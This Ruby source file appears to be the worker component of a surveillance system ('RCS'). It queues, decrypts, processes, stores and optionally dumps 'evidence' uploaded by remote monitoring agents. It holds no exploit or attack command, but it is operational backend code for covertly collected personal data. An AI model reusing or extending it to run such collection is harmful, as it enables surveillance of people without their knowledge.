require_relative 'audio_processor'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
  require 'rcs-db-release/grid'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
  require 'rcs-db/grid'
end

require 'mongo'
require 'openssl'
require 'digest/sha1'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InstanceProcessor
  include RCS::Tracer
  
  SLEEP_TIME = 10
  
  def initialize(instance, ident)
    @evidences = []
    @state = :stopped
    @seconds_sleeping = 0
    
    # get info about the agent instance from evidence db
    #@db = Mongo::Connection.new(RCS::DB::Config.instance.global['CN'], 27017).db("rcs")
    @agent = Item.agents.where({ident: ident, instance: instance}).first
    
    #@info = RCS::EvidenceManager.instance.instance_info @id
    raise "Agent \'#{ident}:#{instance}\' cannot be found." if @agent.nil?
    
    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']}"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    trace :debug, "Evidence key #{@agent['logkey']}"
    @key = Digest::MD5.digest @agent['logkey']
    
    #@call_processor = CallProcessor.new
  end
  
  def resume
    @state = :running
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_PROCESSING)
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
    #trace :debug, "processor #{@id} takes some sleep [slept #{@seconds_sleeping} seconds]."
  end
  
  def put_to_sleep
    @state = :stopped
    #RCS::EvidenceManager.instance.sync_status({:instance => @agent['instance']}, RCS::EvidenceManager::SYNC_IDLE)
    trace :debug, "processor #{self.object_id} is sleeping too much, let's stop!"
  end
  
  def finished?
    @state == :stopped
  end

  def forwarding?
    RCS::DB::Config.instance.global['FORWARD'] == true
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?
    trace :info, "queueing evidence id #{id} for agent #{@agent['instance']}"
    
    process = Proc.new do
      resume
      
      until sleeping_too_much?
        until @evidences.empty?
          resume
          evidence_id = @evidences.shift

          begin
            start_time = Time.now
            
            # get binary evidence
            data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
            raise "Empty evidence" if data.nil?
            
            raw = data.read
            
            if forwarding?
              hash = Digest::SHA1.hexdigest(raw)
              Dir.mkdir "forwarded" unless File.exists? "forwarded"
              path = "forwarded/#{hash}.raw"
              f = File.open(path, 'w') {|f| f.write raw}
              trace :debug, "forwarded raw evidence #{evidence_id} to #{path}"
            end
            
            # deserialize binary evidence and forward decoded
            evidences = RCS::Evidence.new(@key).deserialize(raw) do |data|
              if forwarding?
                path = "forwarded/#{evidence_id}.dec"
                f = File.open(path, 'w') {|f| f.write data}
                trace :debug, "forwarded decoded evidence #{evidence_id} to #{path}"
              end
            end

            if evidences.nil?
              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['instance']}, skipping ..."
              next
            end
            
            trace :debug, "Processing #{evidences.length} evidence(s)."
            
            evidences.each do |evidence|

              puts "EVIDENCE DATA #{evidence.info[:data]}"

              # store evidence_id inside evidence, we need it inside processors
              evidence.info[:db_id] = evidence_id
              
              # delete empty evidences
              if evidence.empty?
                #RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @agent['instance'])
                trace :debug, "deleted empty evidence for agent #{@agent['instance']}"
                next
              end
              
              # store agent instance in evidence (used when storing into db)
              evidence.info[:instance] = @agent['instance']
              evidence.info[:ident] = @agent['ident']
              
              trace :debug, "Processing evidence of type #{evidence.info[:type]}"
              
              # find correct processing module and extend evidence
              mod = "#{evidence.info[:type].to_s.capitalize}Processing"
              evidence.extend eval mod if RCS.const_defined? mod.to_sym
              evidence.process if evidence.respond_to? :process
              
              # override original type
              evidence.info[:type] = evidence.type
              
              #store_evidence evidence
              parsed = evidence.store
              
              #
              # FORWARDER: forward&sign parsed evidence
              #
              
              processing_time = Time.now - start_time
              trace :info, "processed #{evidence.info[:type].upcase} in #{processing_time} sec"
            end
            
            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
            trace :debug, "deleted raw evidence #{evidence_id}"
            
          rescue EvidenceDeserializeError => e
            trace :warn, "[#{@agent['instance']}] decoding failed for #{evidence_id}: " << e.to_s
            # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          rescue Exception => e
            trace :fatal, "FAILURE: " << e.to_s
            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
          end
        end
        take_some_rest
      end
      
      put_to_sleep
    end
    
    if finished?
      trace :debug, "deferring work for #{@agent['instance']}"
      EM.defer process
    end
  end
  
  def to_s
    "instance #{@agent['instance']}: #{@evidences.size}"
  end
  
end

end # ::Worker
end # ::RCS
